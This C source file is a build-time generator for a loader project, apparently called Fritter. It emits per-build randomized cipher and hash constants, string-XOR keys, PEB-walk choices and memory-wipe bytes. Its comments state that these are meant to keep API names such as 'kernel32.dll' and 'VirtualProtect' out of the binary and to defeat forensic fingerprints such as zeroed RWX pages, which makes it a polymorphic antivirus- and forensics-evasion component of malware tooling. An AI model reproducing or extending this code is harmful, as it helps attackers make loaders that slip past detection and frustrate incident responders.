/*
 * gen_poly - emits include/poly_seed.h with per-build randomized
 * cipher / hash constants. Run once per `make` invocation; the same
 * file is included by every CC step so loader, shim, and orchestrator
 * agree on the constants.
 *
 * Seeding:
 *   FRITTER_BUILD_SEED=<u32>  reproducible (use for tagged releases)
 *   unset                     time-mixed (fresh polymorphism per make)
 *
 * Constraints:
 *   cipher rotations  in [3, 25]   (avoids degenerate 0 / 16 / 32)
 *   hash   rotations  in [3, 25]
 *   cipher rounds     even, [20, 28]
 *   hash   rounds     odd,  [27, 35]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#if defined(_WIN32) || defined(_WIN64)
#  include <windows.h>
#  include <process.h>
#  define GETPID() ((uint32_t)_getpid())
#else
#  include <unistd.h>
#  define GETPID() ((uint32_t)getpid())
#endif

static uint32_t xorshift32(uint32_t *s) {
    uint32_t x = *s;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    return *s = x;
}

/* High-resolution sub-second source. clock() resolution varies across
   platforms (CLOCKS_PER_SEC) but is always available; on Windows we
   additionally fold in QueryPerformanceCounter for true sub-microsecond
   variance, on POSIX clock_gettime(CLOCK_MONOTONIC) does the same. */
static uint64_t hires_ticks(void) {
#if defined(_WIN32) || defined(_WIN64)
    LARGE_INTEGER li;
    if (QueryPerformanceCounter(&li)) return (uint64_t)li.QuadPart;
    return (uint64_t)clock();
#elif defined(CLOCK_MONOTONIC)
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) == 0) {
        return ((uint64_t)ts.tv_sec << 32) ^ (uint64_t)ts.tv_nsec;
    }
    return (uint64_t)clock();
#else
    return (uint64_t)clock();
#endif
}

int main(int argc, char **argv) {
    const char *out_path = (argc > 1) ? argv[1] : "include/poly_seed.h";
    uint32_t seed;

    const char *env = getenv("FRITTER_BUILD_SEED");
    if (env && *env) {
        seed = (uint32_t)strtoul(env, NULL, 0);
    } else {
        /* Mix multiple independent entropy sources so back-to-back builds
           in the same wall-clock second still get distinct seeds:
             - time(NULL)        : seconds since epoch
             - hires_ticks()     : sub-second counter (QPC / monotonic ns)
             - stack address     : ASLR jitter
             - process ID        : differs per spawned `gen_poly` invocation
        */
        uintptr_t stack = (uintptr_t)&seed;
        uint64_t  hi    = hires_ticks();
        uint32_t  pid   = GETPID();
        seed  = (uint32_t)time(NULL);
        seed ^= (uint32_t)(hi & 0xFFFFFFFFu);
        seed ^= (uint32_t)(hi >> 32);
        seed ^= (uint32_t)(stack >> 3);
        seed ^= (uint32_t)(stack << 11);
        seed ^= pid * 2654435761u;   /* Knuth multiplicative for pid spread */
    }
    if (seed == 0) seed = 0xA5A5A5A5u;

    uint32_t s = seed;
    int r0 = 3 + (int)(xorshift32(&s) % 23u);
    int r1 = 3 + (int)(xorshift32(&s) % 23u);
    int r2 = 3 + (int)(xorshift32(&s) % 23u);
    int r3 = 3 + (int)(xorshift32(&s) % 23u);
    int r4 = 3 + (int)(xorshift32(&s) % 23u);
    int r5 = 3 + (int)(xorshift32(&s) % 23u);
    int ha = 3 + (int)(xorshift32(&s) % 23u);
    int hb = 3 + (int)(xorshift32(&s) % 23u);
    int cr = 20 + (int)(xorshift32(&s) % 5u) * 2;   /* 20,22,24,26,28 */
    int hr = 27 + (int)(xorshift32(&s) % 5u) * 2;   /* 27,29,31,33,35 */
    uint32_t shim_salt = xorshift32(&s);             /* 32 bits of structural shim variation */
    /* String-XOR key: forced into [0x80, 0xFF] so XOR with any printable
       ASCII char (≤ 0x7E) never produces a 0 byte (which would terminate
       a scrambled string early). Applied per-char to stack-built API
       strings so literal "kernel32.dll" / "VirtualProtect" never appear
       in the shim's compiled .text or runtime stack frame. */
    uint8_t  string_xor = (uint8_t)(0x80u | (xorshift32(&s) & 0x7Fu));
    /* Shim PEB-list pick: 0 = InMemoryOrderModuleList,
       1 = InInitializationOrderModuleList. Mirrors loader's 1-of-2 pick. */
    uint32_t shim_peb_pick = xorshift32(&s) & 1u;
    /* Loader wipe byte: any 8-bit value used in erase_memory's Memset.
       Defeats the "zeroed page near decoded shim" forensic anchor. */
    uint8_t  loader_wipe = (uint8_t)(xorshift32(&s) & 0xFFu);
    /* Loader PEB walk direction: 0 = Flink (forward), 1 = Blink (reverse).
       Both directions traverse the full doubly-linked module list. */
    uint32_t loader_peb_dir = xorshift32(&s) & 1u;
    /* Loader 32-bit poly salt - drives #if-gated XOR-cancel sites in
       MainProc / FritterLoader, parallel to SHIM_POLY_SALT. */
    uint32_t loader_salt = xorshift32(&s);
    /* Shim cleanup wipe byte - used for both the loader-page wipe and
       the g_ctx scrub. Any 8-bit value; if 0, behavior matches original
       zero-fill cleanup. Defeats the "freshly-zeroed RWX pages + zeroed
       VEH_CTX struct" forensic fingerprint when non-zero. */
    uint8_t  shim_wipe = (uint8_t)(xorshift32(&s) & 0xFFu);

    FILE *f = fopen(out_path, "w");
    if (!f) {
        fprintf(stderr, "gen_poly: cannot open %s for writing\n", out_path);
        return 1;
    }
    fprintf(f, "/* Auto-generated by tools/gen_poly. Do not edit. */\n");
    fprintf(f, "/* Build seed: 0x%08X */\n", seed);
    fprintf(f, "#ifndef POLY_SEED_H\n");
    fprintf(f, "#define POLY_SEED_H\n");
    fprintf(f, "#define CIPHER_R0     %d\n", r0);
    fprintf(f, "#define CIPHER_R1     %d\n", r1);
    fprintf(f, "#define CIPHER_R2     %d\n", r2);
    fprintf(f, "#define CIPHER_R3     %d\n", r3);
    fprintf(f, "#define CIPHER_R4     %d\n", r4);
    fprintf(f, "#define CIPHER_R5     %d\n", r5);
    fprintf(f, "#define CIPHER_ROUNDS %d\n", cr);
    fprintf(f, "#define HASH_ROT_A    %d\n", ha);
    fprintf(f, "#define HASH_ROT_B    %d\n", hb);
    fprintf(f, "#define HASH_ROUNDS   %d\n", hr);
    fprintf(f, "#define SHIM_POLY_SALT 0x%08Xu\n", shim_salt);
    fprintf(f, "#define SHIM_STRING_XOR 0x%02Xu\n", string_xor);
    fprintf(f, "#define SHIM_PEB_PICK   %u\n", shim_peb_pick);
    fprintf(f, "#define LOADER_WIPE_BYTE 0x%02Xu\n", loader_wipe);
    fprintf(f, "#define LOADER_PEB_DIR   %u\n", loader_peb_dir);
    fprintf(f, "#define LOADER_POLY_SALT 0x%08Xu\n", loader_salt);
    fprintf(f, "#define SHIM_WIPE_BYTE   0x%02Xu\n", shim_wipe);
    fprintf(f, "#endif\n");
    fclose(f);

    fprintf(stderr,
        "[poly] %s seed=0x%08X cipher=R%d/%d/%d/%d/%d/%d rounds=%d hash=A%d/B%d rounds=%d "
        "shim_salt=0x%08X string_xor=0x%02X peb_pick=%u "
        "loader_wipe=0x%02X loader_peb_dir=%u loader_salt=0x%08X shim_wipe=0x%02X\n",
        out_path, seed, r0, r1, r2, r3, r4, r5, cr, ha, hb, hr,
        shim_salt, string_xor, shim_peb_pick,
        loader_wipe, loader_peb_dir, loader_salt, shim_wipe);
    return 0;
}
